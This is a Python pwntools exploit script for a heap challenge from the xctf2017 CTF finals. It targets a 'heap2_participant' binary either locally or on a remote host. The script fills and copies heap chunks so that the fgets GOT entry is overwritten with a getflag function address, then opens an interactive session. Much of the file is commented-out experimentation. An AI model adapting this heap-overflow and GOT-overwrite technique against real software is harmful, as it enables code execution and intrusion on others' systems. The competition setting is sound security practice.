from pwn import *
import sys

LOCAL = True

HOST = '128.199.72.218'
PORT = 12345

def add(s):
    r.sendline('add '+ s)
    

def show(idx):
    r.sendline('show ' + str(idx))  
    #data = r.recvuntil('>')
    #return data

def copy(fr,to):
    r.sendline('copy '+str(fr)+' '+str(to))
    #r.recvuntil('>')


def exploit(r):
    for i in xrange(9):
        r.recvline()

    FGETGOT = 0x5655a558 - (0x5655a558 - 0x56558024)
    GETFLAG = 0x5655a558 + (0x56555d58 - 0x5655a558)

    #Random leaks
    add(pack(FGETGOT)+pack(FGETGOT)+pack(FGETGOT)+pack(FGETGOT)+ pack(FGETGOT)  + pack(FGETGOT))
    add('BBBB')
    add('CCCCCCCCCCCCCCCCCCCC')
    add(pack(GETFLAG)+pack(GETFLAG)+pack(GETFLAG)+pack(GETFLAG)+pack(GETFLAG)+pack(GETFLAG))
    add('BBBB')
    print "Write finish"
    pause()
    copy(0,1)
    copy(3,2)

    # add('AAAAAAAAAAAAAAAA' + p32(0x000000FF))# + p32(0x56558024))
    # add('BBBB')
    # add('CCCCCCCCCCCCCCCCCCCC')
    # add('DDDD')
    # add('DDDD')
    # add('DDDD')
    # add('DDDD')
    # add('DDDD')
    # add('DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD')

    # copy(0,1)
    # show(2)    

    # print r.recv()[:-0x20]
    # data = r.recvline()
    # data2 = r.recvline()
    # print "hi:" + str(len(data2))
    # print hex(u32(data2[-17:-13]))
    # data = r.recvline()
    #HEAP_LEAK = u32(r.recvline())

    #print hex(HEAP_LEAK)
    #copy(3,2)
    # add(pack(0x56555d58))
    # pause()
    # GETFLAG = 0x80004148 + (0x56555d58 - 0x5655a558)
    # FGETGOT = 0x80004148 - (0x5655a558 - 0x56558024)
    # # GETFLAG = 0x5655a558 + (0x56555d58 - 0x5655a558
    # pause()
    #copy(0,1)
    # #show(2)
    #copy(3,2)
    #show(2)
    #copy(0,2)
    #add(' ')
    #show(2)


    # # creating 4 chunks
    # add('AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIJJJJ')
    # add('KKKKK')
    # add('LLLLL')
    # add('MMMMM')
    # pause()
    # copy(0,1)

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) == 4:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process('/home/rootkid/CTF_shits/xctf2017/finals/csit2/heap2_participant')
        print util.proc.pidof(r)
        pause()
        exploit(r)
    